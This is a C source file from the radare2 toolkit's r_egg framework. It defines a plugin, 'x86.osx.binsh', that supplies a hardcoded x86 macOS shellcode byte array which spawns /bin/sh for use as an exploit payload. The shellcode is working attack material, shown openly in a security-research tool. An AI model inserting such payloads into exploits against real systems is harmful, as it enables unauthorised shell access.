/* radare - LGPL - Copyright 2011 pancake<@nopcode.org> */
#include <r_egg.h>

static ut8 x86_osx_binsh[] =
	"\x31\xdb\x6a\x3b\x58\x53\xeb\x18\x5f"
	"\x57\x53\x54\x54\x57\x6a\xff\x88\x5f"
	"\x07\x89\x5f\xf5\x88\x5f\xfa\x9a\xff"
	"\xff\xff\xff\x2b\xff\xe8\xe3\xff\xff"
	"\xff" // /bin/shX";
	"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x58";

static RBuffer *build (REgg *egg) {
	RBuffer *buf = r_buf_new ();
	const char *shell = r_egg_option_get (egg, "shell");
	if (shell) {
		eprintf ("TODO: implement support to change the shell\n");
		r_buf_free (buf);
		return NULL;
	} else {
		r_buf_set_bytes (buf, x86_osx_binsh, strlen (x86_osx_binsh));
	}
	return buf;
}

REggPlugin r_egg_plugin_x86_osx_binsh = {
	.name = "x86.osx.binsh",
	.desc = "execute shell=/bin/sh",
	.bytes = x86_osx_binsh,
	.length = sizeof (x86_osx_binsh),
	.build = build
};
